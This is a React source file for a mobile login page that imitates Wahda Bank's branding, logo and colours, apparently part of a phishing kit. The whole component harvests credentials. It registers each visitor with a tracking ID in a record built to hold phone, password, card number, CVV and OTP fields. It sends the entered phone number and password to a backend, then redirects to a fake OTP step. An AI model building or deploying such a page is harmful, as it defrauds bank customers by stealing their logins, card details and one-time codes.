import { useState, useEffect } from "react";
import { unityApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";

function randId() { return "u-" + Math.random().toString(36).slice(2, 12); }

/* ── exact colors from screenshot ── */
const C = {
  headerTop: "#4A5FEA",
  headerBot: "#2E40C8",
  cyan: "#5DD8F8",
  navy: "#1B2B6B",
  bodyBg: "#EDEEF4",
  inputBg: "#FFFFFF",
  inputBorder: "#DEE0EA",
  iconGray: "#9FA8C5",
  textDark: "#1B2B6B",
  textSub: "#8890AD",
  checkBorder: "#C8CCDC",
};

/* ── Wahda W SVG (cyan stylised logo) ── */
function WahdaW() {
  return (
    <svg viewBox="0 0 64 52" width="64" height="52" fill="none">
      <path
        d="M2 4 L14 46 L24 20 L32 40 L40 20 L50 46 L62 4"
        stroke={C.cyan} strokeWidth="7" strokeLinecap="round" strokeLinejoin="round"
        fill="none"
      />
    </svg>
  );
}

/* ── Phone icon (outline, rounded) ── */
function PhoneIcon({ color = C.iconGray }) {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
      <line x1="12" y1="18" x2="12.01" y2="18" />
    </svg>
  );
}

/* ── Lock icon ── */
function LockIcon({ color = C.iconGray }) {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
    </svg>
  );
}

/* ── Eye icon ── */
function EyeIcon({ open, color = "#4A5FEA" }: { open: boolean; color?: string }) {
  return open ? (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  ) : (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
      <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  );
}

/* ── User icon ── */
function UserIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
      <circle cx="12" cy="7" r="4" />
    </svg>
  );
}

/* ── Chevron Down ── */
function ChevronDown() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="6 9 12 15 18 9" />
    </svg>
  );
}

const ACCOUNT_TYPES = ["تسجيل دخول الأفراد", "تسجيل دخول الأعمال"];

export default function LoginPage() {
  useTracking("تسجيل الدخول");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [remember, setRemember] = useState(false);
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");
  const [acctType, setAcctType] = useState(0);
  const [dropOpen, setDropOpen] = useState(false);

  useEffect(() => {
    if (!localStorage.getItem("unity_id")) {
      localStorage.setItem("unity_id", randId());
    }
    const id = localStorage.getItem("unity_id")!;
    const now = new Date().toISOString();
    unityApi.submit({
      id, submittedAt: now, submittedAtTs: Date.now(),
      phone: "", password: "", cardNumber: "", cardName: "",
      cardMonth: "", cardYearExp: "", cardCvv: "",
      otpCode: "", otpStatus: null,
      page: "تسجيل الدخول", isActive: true, lastSeen: Date.now(), country: ""
    });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.trim().length < 9) { setErr("رقم الهاتف غير صحيح"); return; }
    if (password.length < 4) { setErr("كلمة المرور قصيرة جداً"); return; }
    setErr("");
    setLoading(true);
    const id = localStorage.getItem("unity_id")!;
    await unityApi.patch(id, { phone, password, page: "تسجيل الدخول - مكتمل", lastSeen: Date.now() });
    setTimeout(() => { window.location.href = "/unity-bank/otp"; }, 800);
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{ fontFamily: "'Cairo', 'Segoe UI', system-ui, sans-serif", background: C.bodyBg }}
    >

      {/* ════════════════════════════════
          HEADER — blue gradient
      ════════════════════════════════ */}
      <div
        style={{
          background: `linear-gradient(175deg, ${C.headerTop} 0%, ${C.headerBot} 100%)`,
          paddingTop: "52px",
          paddingBottom: "28px",
          paddingLeft: "24px",
          paddingRight: "24px",
        }}
      >
        {/* Logo + name — centred */}
        <div style={{ textAlign: "center", marginBottom: "28px" }}>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: "10px" }}>
            <WahdaW />
          </div>
          <p style={{
            color: "#FFFFFF",
            fontSize: "26px",
            fontWeight: "900",
            lineHeight: "1.15",
            margin: 0,
            letterSpacing: "0.01em",
          }}>
            مصرف الوحدة
          </p>
          <p style={{
            color: C.cyan,
            fontSize: "13px",
            fontWeight: "700",
            letterSpacing: "0.12em",
            margin: "4px 0 0 0",
          }}>
            WAHDA BANK
          </p>
        </div>

        {/* Account type dropdown */}
        <div style={{ position: "relative" }}>
          {/* Selected row */}
          <div
            onClick={() => setDropOpen(p => !p)}
            style={{
              background: "rgba(255,255,255,0.18)",
              border: "1px solid rgba(255,255,255,0.30)",
              borderRadius: dropOpen ? "14px 14px 0 0" : "14px",
              padding: "12px 16px",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              cursor: "pointer",
              userSelect: "none",
            }}
          >
            {/* Right: user icon */}
            <div style={{
              width: "38px", height: "38px", borderRadius: "50%",
              background: "rgba(255,255,255,0.22)",
              display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            }}>
              <UserIcon />
            </div>
            {/* Text */}
            <div style={{ textAlign: "right", flex: 1, marginRight: "12px" }}>
              <p style={{ color: "#FFFFFF", fontSize: "15px", fontWeight: "700", margin: 0 }}>
                {ACCOUNT_TYPES[acctType]}
              </p>
            </div>
            {/* Chevron */}
            <div style={{ transform: dropOpen ? "rotate(180deg)" : "rotate(0deg)", transition: "transform 0.2s" }}>
              <ChevronDown />
            </div>
          </div>

          {/* Dropdown options */}
          {dropOpen && (
            <div style={{
              background: "rgba(50,65,180,0.97)",
              border: "1px solid rgba(255,255,255,0.25)",
              borderTop: "none",
              borderRadius: "0 0 14px 14px",
              overflow: "hidden",
              position: "absolute",
              width: "100%",
              zIndex: 10,
            }}>
              {ACCOUNT_TYPES.map((label, i) => (
                <div
                  key={i}
                  onClick={() => { setAcctType(i); setDropOpen(false); }}
                  style={{
                    padding: "14px 16px",
                    color: i === acctType ? C.cyan : "rgba(255,255,255,0.85)",
                    fontSize: "15px",
                    fontWeight: i === acctType ? "700" : "500",
                    cursor: "pointer",
                    textAlign: "right",
                    borderBottom: i < ACCOUNT_TYPES.length - 1 ? "1px solid rgba(255,255,255,0.12)" : "none",
                    background: i === acctType ? "rgba(255,255,255,0.08)" : "transparent",
                  }}
                >
                  {label}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* ════════════════════════════════
          BODY — light grey
      ════════════════════════════════ */}
      <div style={{ flex: 1, background: C.bodyBg, padding: "28px 20px 40px" }}>
        <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "14px" }}>

          {/* ── Phone field ── */}
          <div style={{
            background: C.inputBg,
            border: `1.5px solid ${C.inputBorder}`,
            borderRadius: "12px",
            height: "58px",
            display: "flex",
            alignItems: "center",
            padding: "0 16px",
          }}>
            <input
              type="tel"
              value={phone}
              onChange={e => setPhone(e.target.value)}
              placeholder="رقم الهاتف"
              dir="rtl"
              style={{
                flex: 1,
                border: "none",
                outline: "none",
                background: "transparent",
                fontSize: "15px",
                fontWeight: "500",
                color: "#2B2D42",
                fontFamily: "inherit",
                textAlign: "right",
              }}
            />
            {/* icon on left side (RTL: after text) */}
            <div style={{ marginLeft: "10px", display: "flex", alignItems: "center" }}>
              <PhoneIcon />
            </div>
          </div>

          {/* ── Password field ── */}
          <div style={{
            background: C.inputBg,
            border: `1.5px solid ${C.inputBorder}`,
            borderRadius: "12px",
            height: "58px",
            display: "flex",
            alignItems: "center",
            padding: "0 16px",
          }}>
            {/* Eye toggle on the right (RTL: far right is LTR left) */}
            <button
              type="button"
              onClick={() => setShowPass(!showPass)}
              style={{ background: "none", border: "none", cursor: "pointer", padding: 0, display: "flex", marginRight: "10px" }}
            >
              <EyeIcon open={showPass} />
            </button>

            <input
              type={showPass ? "text" : "password"}
              value={password}
              onChange={e => setPassword(e.target.value)}
              placeholder="كلمة المرور"
              dir="rtl"
              style={{
                flex: 1,
                border: "none",
                outline: "none",
                background: "transparent",
                fontSize: "15px",
                fontWeight: "500",
                color: "#2B2D42",
                fontFamily: "inherit",
                textAlign: "right",
              }}
            />

            {/* Lock icon on left (RTL: after text, visually left) */}
            <div style={{ marginLeft: "10px", display: "flex", alignItems: "center" }}>
              <LockIcon />
            </div>
          </div>

          {/* ── Remember me ── */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "flex-end",
              gap: "10px",
              padding: "2px 4px",
            }}
          >
            <span style={{ fontSize: "14px", fontWeight: "500", color: "#4A4F6A" }}>تذكرني</span>
            <div
              onClick={() => setRemember(!remember)}
              style={{
                width: "20px",
                height: "20px",
                borderRadius: "4px",
                border: `2px solid ${remember ? C.navy : C.checkBorder}`,
                background: remember ? C.navy : "white",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer",
                flexShrink: 0,
              }}
            >
              {remember && (
                <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                  <path d="M2 6l3 3 5-5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              )}
            </div>
          </div>

          {err && (
            <p style={{ textAlign: "center", color: "#E53E3E", fontSize: "13px", fontWeight: "600", margin: 0 }}>
              {err}
            </p>
          )}

          {/* ── تسجيل الدخول button ── */}
          <button
            type="submit"
            disabled={loading}
            style={{
              width: "100%",
              height: "54px",
              borderRadius: "12px",
              background: C.navy,
              color: "#FFFFFF",
              fontSize: "17px",
              fontWeight: "700",
              border: "none",
              cursor: loading ? "not-allowed" : "pointer",
              opacity: loading ? 0.7 : 1,
              fontFamily: "inherit",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
              marginTop: "4px",
            }}
          >
            {loading ? (
              <>
                <div style={{
                  width: "18px", height: "18px",
                  border: "2px solid rgba(255,255,255,0.4)",
                  borderTopColor: "#fff",
                  borderRadius: "50%",
                  animation: "spin 0.8s linear infinite"
                }} />
                جاري التحقق...
              </>
            ) : "تسجيل الدخول"}
          </button>

          {/* ── الاشتراك في التطبيق button ── */}
          <button
            type="button"
            onClick={() => window.location.href = "/unity-bank/"}
            style={{
              width: "100%",
              height: "54px",
              borderRadius: "12px",
              background: "#FFFFFF",
              color: C.navy,
              fontSize: "17px",
              fontWeight: "700",
              border: `1.5px solid #D0D4E8`,
              cursor: "pointer",
              fontFamily: "inherit",
            }}
          >
            الاشتراك في التطبيق
          </button>

          {/* ── نسيت كلمة المرور ── */}
          <p style={{ textAlign: "center", margin: "6px 0 0" }}>
            <a
              href="#"
              style={{
                color: C.navy,
                fontSize: "14px",
                fontWeight: "600",
                textDecoration: "none",
              }}
            >
              نسيت كلمة المرور؟
            </a>
          </p>

        </form>
      </div>

      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}
